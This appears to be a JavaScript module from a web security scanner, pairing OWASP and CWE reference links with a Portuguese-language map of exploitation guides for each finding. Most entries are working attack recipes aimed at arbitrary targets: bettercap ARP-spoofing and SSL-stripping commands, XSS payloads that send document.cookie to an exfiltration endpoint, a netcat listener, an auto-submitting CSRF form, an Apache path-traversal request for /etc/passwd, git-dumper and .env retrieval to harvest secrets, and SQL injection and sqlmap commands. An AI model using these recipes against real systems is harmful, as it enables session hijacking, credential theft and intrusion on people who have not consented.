export const REFS = {
  hsts: { label: 'OWASP — HTTP Strict Transport Security', url: 'https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html' },
  csp: { label: 'OWASP — Content Security Policy', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html' },
  clickjacking: { label: 'OWASP — Clickjacking Defense', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html' },
  mimeSniffing: { label: 'OWASP Secure Headers Project', url: 'https://owasp.org/www-project-secure-headers/' },
  referrer: { label: 'OWASP Secure Headers Project', url: 'https://owasp.org/www-project-secure-headers/' },
  session: { label: 'OWASP — Session Management', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html' },
  csrf: { label: 'OWASP — CSRF Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html' },
  infoDisclosure: { label: 'CWE-200 — Exposure of Sensitive Information', url: 'https://cwe.mitre.org/data/definitions/200.html' },
  fileExposure: { label: 'CWE-538 — File and Directory Information Exposure', url: 'https://cwe.mitre.org/data/definitions/538.html' },
  transportSec: { label: 'CWE-319 — Cleartext Transmission of Sensitive Information', url: 'https://cwe.mitre.org/data/definitions/319.html' },
  tls: { label: 'OWASP — Transport Layer Security', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html' },
  xss: { label: 'OWASP — XSS Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
  sqli: { label: 'OWASP — SQL Injection Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html' },
  cors: { label: 'OWASP — Cross-Origin Resource Sharing', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html' },
};

export const EXPLOITATION = {
  hsts: "Como explorar a ausencia de HSTS:\n1. Faca MITM entre a vitima e o servidor (ARP spoofing na mesma rede, rogue Wi-Fi)\n2. Quando o navegador fizer a primeira requisicao HTTP, intercepte\n3. Use sslstrip ou bettercap para downgrade:\n   bettercap -eval \"set arp.spoof.targets <IP_ALVO>; arp.spoof on; set http.proxy.sslstrip true; http.proxy on\"\n4. Capture cookies (sem Secure), credenciais e modifique respostas\n5. Ferramentas: bettercap, sslstrip, mitmproxy, ettercap",
  csp: "Como explorar a ausencia de CSP:\n1. Encontre um ponto de XSS no alvo\n2. Crie payload para exfiltrar dados:\n   <script>new Image().src='http://localhost:3000/api/exfil?c='+document.cookie</script>\n3. Sem CSP, o navegador nao bloqueia a requisicao externa\n4. Configure listener: nc -lvnp 80\n5. O cookie de sessao sera capturado no seu servidor",
  clickjacking: "Como explorar ausencia de X-Frame-Options:\n1. Crie pagina com iframe apontando para o alvo\n2. Sobreponha um botao sobre uma acao critica (ex: \"Excluir conta\")\n3. Hospede e envie o link para a vitima logada\n4. O clique executara a acao sem que ela perceba\n5. Use ngrok para expor localhost",
  mimeSniffing: "Como explorar ausencia de X-Content-Type-Options:\n1. Encontre upload de arquivos ou reflection de conteudo\n2. Envie .txt ou .jpg com conteudo HTML/JS:\n   <script>document.location='http://localhost:3000/api/exfil?c='+document.cookie</script>\n3. Navegador renderiza como HTML e executa o script",
  referrer: "Como explorar ausencia de Referrer-Policy:\n1. Identifique endpoint com token na URL (ex: /reset-password?token=abc)\n2. Coloque link externo em comentario/perfil\n3. Quando a vitima clicar, o header Referer vaza a URL completa\n4. Capture no seu servidor: python3 -m http.server 80\n5. Use o token para sequestrar a acao",
  session: "Como explorar cookies sem seguranca:\n\nCookie sem Secure:\n- Faca MITM e capture o cookie em HTTP: tshark -i eth0 -Y \"http.cookie\" -T fields -e http.cookie\n\nCookie sem HttpOnly:\n- Use XSS para ler cookies:\n  <script>new Image().src='http://localhost:3000/api/exfil?c='+document.cookie</script>\n\nSameSite ausente:\n- Crie site malicioso que faca requisicoes cross-site ao alvo",
  csrf: "Como explorar formulario POST sem token CSRF:\n1. Crie pagina que auto-submeta o formulario:\n   <html><body onload=\"document.forms[0].submit()\">\n   <form action=\"https://ALVO/alterar-email\" method=\"POST\">\n   <input name=\"email\" value=\"atacante@dominio.com\"></form></body></html>\n2. Envie o link para a vitima logada\n3. A acao sera executada sem consentimento\n4. Use Burp Suite > Engagement Tools > Generate CSRF PoC",
  infoDisclosure: "Como explorar vazamento em headers:\n1. Identifique versao exata (Apache/2.4.49, Express, etc)\n2. Pesquise CVEs: searchsploit apache 2.4.49\n3. Use exploits especificos da versao:\n   curl -v \"http://ALVO/cgi-bin/.%2e/%2e%2e/etc/passwd\"",
  fileExposure: "Como explorar caminhos expostos:\n\n.git exposto:\n1. git-dumper: git clone https://github.com/arthaud/git-dumper.git\n2. ./git_dumper.py http://ALVO/.git/ ~/repo/\n3. cd ~/repo && git grep -i \"password|secret|token\" $(git rev-list --all)\n\n.env exposto:\n1. curl http://ALVO/.env\n2. Procure DB_PASSWORD, API_KEY, AWS_SECRET_KEY, JWT_SECRET\n\nBackups:\n1. wget http://ALVO/database.sql.bak\n2. cat database.sql.bak | grep -i \"password|hash|admin\"",
  transportSec: "Como explorar ausencia de HTTPS:\n1. Na mesma rede, use ARP spoofing:\n   bettercap -eval \"set arp.spoof.targets <IP>; arp.spoof on; net.sniff on\"\n2. Todo trafego HTTP fica visivel - credenciais, cookies, tokens\n3. Ferramentas: Wireshark, tcpdump, bettercap, airgeddon",
  tls: "Como explorar TLS fraco:\n1. Force downgrade: openssl s_client -connect ALVO:443 -tls1\n2. Use testssl.sh: testssl.sh --full https://ALVO\n3. Certificado expirado: echo | openssl s_client -connect ALVO:443 2>/dev/null | openssl x509 -text | grep -i \"DNS:\"",
  xss: "Como explorar XSS refletido:\n1. Use o botao EXPLORAR para gerar o link com payload\n2. O payload tenta roubar o cookie e enviar para /api/exfil\n3. Para testes manuais:\n   <script>new Image().src='http://localhost:3000/api/exfil?c='+document.cookie</script>\n4. Veja os dados capturados em: http://localhost:3000/api/exfil-logs",
  sqli: "Como explorar SQL Injection:\n1. Use o botao EXPLORAR para tentar extracao automatica\n2. O exploit tenta: versao do banco, tabelas, dump de usuarios\n3. Para testes manuais:\n   curl \"http://ALVO/pagina?id=1 UNION SELECT 1,database(),user(),version(),5--\"\n4. Use sqlmap: sqlmap -u \"http://ALVO/pagina?id=1\" --batch --dbs",
  cors: "Como explorar CORS:\n1. Use o botao EXPLORAR para gerar PoC HTML\n2. Crie uma pagina com o fetch() gerado e faca a vitima acessar\n3. Os dados autenticados do alvo vazarao para /api/exfil\n4. Veja os logs em: http://localhost:3000/api/exfil-logs",
};

export function makeResult(severity, category, title, description, recommendation, refKey, exploitKey) {
  return {
    severity,
    category,
    title,
    description,
    recommendation,
    reference: refKey ? REFS[refKey] ?? null : null,
    exploitation: exploitKey ? EXPLOITATION[exploitKey] ?? null : null,
  };
}